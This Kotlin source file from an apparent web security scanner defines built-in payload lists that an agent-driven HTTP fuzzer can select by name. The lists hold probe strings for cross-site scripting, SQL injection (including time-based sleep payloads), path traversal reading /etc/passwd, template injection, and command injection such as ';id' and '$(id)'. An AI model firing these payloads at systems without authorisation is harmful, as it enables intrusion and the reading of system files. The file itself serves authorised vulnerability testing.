package io.bitbytelab.raijin.core

/**
 * Built-in, non-destructive detection payload sets for `http_fuzz`, so an agent
 * can say `payload_library: "sqli"` instead of hand-supplying payloads. These
 * are standard probe strings (error/reflection/time-based), not exploits.
 */
object PayloadLibraries {

    private val libs: Map<String, List<String>> = mapOf(
        "xss" to listOf(
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><img src=x onerror=alert(1)>",
            "'-alert(1)-'"
        ),
        "sqli" to listOf(
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1-- -",
            "\" OR \"1\"=\"1",
            "1' ORDER BY 1-- -",
            "' UNION SELECT NULL-- -",
            "' AND SLEEP(5)-- -",
            "1) AND SLEEP(5)-- -",
            "';WAITFOR DELAY '0:0:5'-- -",
            "' AND pg_sleep(5)-- -",
            // Comment-truncation payloads (above) never reach the sleep call when the value is
            // concatenated BETWEEN two string literals rather than terminating a clause — these
            // close-then-reopen the string instead, for that insertion context (e.g. a cookie
            // value used as `... WHERE col = 'x' || :value || 'y'`).
            "x'||pg_sleep(5)||'",
            "'||pg_sleep(5)||'",
            "x' AND SLEEP(5) AND 'x'='x",
            "x';WAITFOR DELAY '0:0:5'--",
            "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)||'"
        ),
        "traversal" to listOf(
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini"
        ),
        "ssti" to listOf(
            "{{7*7}}",
            "\${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{7*'7'}}",
            "\${{7*7}}",
            "*{7*7}"
        ),
        "cmdi" to listOf(
            ";id",
            "|id",
            "||id",
            "&&id",
            "\$(id)",
            "`id`",
            ";sleep 5",
            "| sleep 5",
            "%0aid"
        )
    )

    /** Returns the payload list for [name] (case-insensitive), or null if unknown. */
    fun get(name: String): List<String>? = libs[name.lowercase().trim()]

    fun names(): List<String> = libs.keys.toList()
}
